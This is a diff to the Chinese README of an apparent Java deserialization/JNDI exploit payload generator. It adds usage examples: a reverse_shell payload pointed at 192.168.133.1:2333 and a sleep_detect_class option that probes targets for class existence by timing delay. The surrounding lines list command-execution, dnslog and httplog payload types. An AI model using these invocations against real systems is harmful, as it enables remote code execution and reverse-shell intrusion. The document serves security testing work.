@@ -2977,6 +2977,8 @@ rmi://127.0.0.1:1234/Basic
 
 ```bash
 -m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -className "org.springframework.expression.Test1"
+
+-m ThirdPartyAttack -g CustomClass -a "reverse_shell:192.168.133.1:2333" -className "Test1"
 ```
 
 #### superClassName 为字节码设置父类
@@ -3019,6 +3021,8 @@ rmi://127.0.0.1:1234/Basic
 
 ```bash
 -m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -encode "Base64"
+
+-m ThirdPartyAttack -g CustomClass -a "sleep_detect_class:java.lang.String:5" -encode="Base64"
 ```
 
 #####  Gzip+Base64编码
@@ -3169,6 +3173,7 @@ rmi://127.0.0.1:1234/Basic
 * [ ] sleep 生成延时payload
 * [ ] dnslog 生成dnslog payload
 * [ ] httplog 生成httplog payload
+* [ ] sleep_detect_class 使用延迟探测某个类是否存在
 * [ ] raw_cmd 原生的命令执行
 * [ ] win_cmd 在windows下执行命令
 * [ ] linux_cmd 在linux下执行命令
@@ -3208,6 +3213,7 @@ rmi://127.0.0.1:1234/Basic
 * [ ] sleep 生成延时payload
 * [ ] dnslog 生成dnslog payload
 * [ ] httplog 生成httplog payload
+* [ ] sleep_detect_class 使用延迟探测某个类是否存在
 * [ ] raw_cmd 原生的命令执行
 * [ ] win_cmd 在windows下执行命令
 * [ ] linux_cmd 在linux下执行命令
